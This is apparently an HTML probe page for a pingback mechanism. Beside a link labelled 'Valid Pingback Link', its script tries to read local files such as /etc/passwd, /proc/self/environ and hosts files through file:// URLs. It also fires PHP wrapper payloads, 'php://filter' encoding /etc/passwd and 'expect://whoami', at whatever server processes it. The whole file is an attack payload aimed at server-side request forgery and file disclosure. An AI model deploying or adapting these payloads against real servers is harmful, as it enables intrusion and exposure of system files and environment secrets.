<!-- file_read_test.html -->
<!DOCTYPE html>
<html>
<body>
    <a href="https://about.fb.com/news/2026/01/whatsapp-group-chats-member-tags-text-stickers-event-reminders/">
        Valid Pingback Link
    </a>
    
    <script>
        // Test if file:// protocol works (unlikely but worth testing)
        const fileTests = [
            'file:///etc/passwd',
            'file:///etc/hosts',
            'file:///C:/Windows/System32/drivers/etc/hosts',
            'file:///proc/self/environ',  // Environment variables
            'file:///etc/issue',          // OS version
        ];
        
        fileTests.forEach(url => {
            const img = new Image();
            img.onerror = function() {
                console.log('Attempted:', url.substring(0, 30) + '...');
            };
            img.src = url;
        });
        
        // Test PHP wrappers (if PHP is server side)
        const phpWrappers = [
            'php://filter/convert.base64-encode/resource=/etc/passwd',
            'expect://whoami',
            'data://text/plain;base64,SSB3YXMgaGVyZQ==',
        ];
        
        phpWrappers.forEach(url => {
            fetch(url).catch(() => {});
        });
    </script>
</body>
</html>
